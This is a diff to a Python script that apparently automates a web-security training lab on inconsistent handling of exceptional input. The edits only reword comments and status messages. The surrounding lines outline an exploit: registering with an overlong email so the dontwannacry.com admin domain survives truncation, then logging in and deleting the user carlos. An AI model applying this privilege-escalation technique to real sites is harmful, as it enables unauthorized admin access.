@@ -7,14 +7,14 @@
 # Lab: Inconsistent handling of exceptional input
 #
 # Steps: 1. Fetch the register page
-#        2. Extract csrf token and session cookie to register a new account
+#        2. Extract the csrf token and session cookie to register a new account
 #        3. Register a new account Register a new account with a suitable offset
 #           and dontwannacry.com before the real domain
 #        4. Fetch the email client
 #        5. Extract the link of account registration
 #        6. Complete the account registration by following the link
 #        7. Fetch the login page
-#        8. Extract csrf token and session cookie to login
+#        8. Extract the csrf token and session cookie to login
 #        9. Login to the new account
 #        10. Delete carlos from the admin panel
 #
@@ -55,7 +55,7 @@ session = register_page.cookies.get("session")
 # extract the csrf token
 csrf = re.findall("csrf.+value=\"(.+)\"", register_page.text)[0]
 
-print(Fore.WHITE + "⦗2⦘ Extracting csrf token and session cookie to register a new account.. " + Fore.GREEN + "OK")
+print(Fore.WHITE + "⦗2⦘ Extracting the csrf token and session cookie to register a new account.. " + Fore.GREEN + "OK")
 
 # the username of the new account
 # you can change this to what you want
@@ -139,7 +139,7 @@ session = get_login.cookies.get("session")
 # extract the csrf token
 csrf = re.findall("csrf.+value=\"(.+)\"", get_login.text)[0]
 
-print(Fore.WHITE + "⦗8⦘ Extracting csrf token and session cookie to login.. " + Fore.GREEN + "OK")
+print(Fore.WHITE + "⦗8⦘ Extracting the csrf token and session cookie to login.. " + Fore.GREEN + "OK")
 
 # set credentials
 data = {
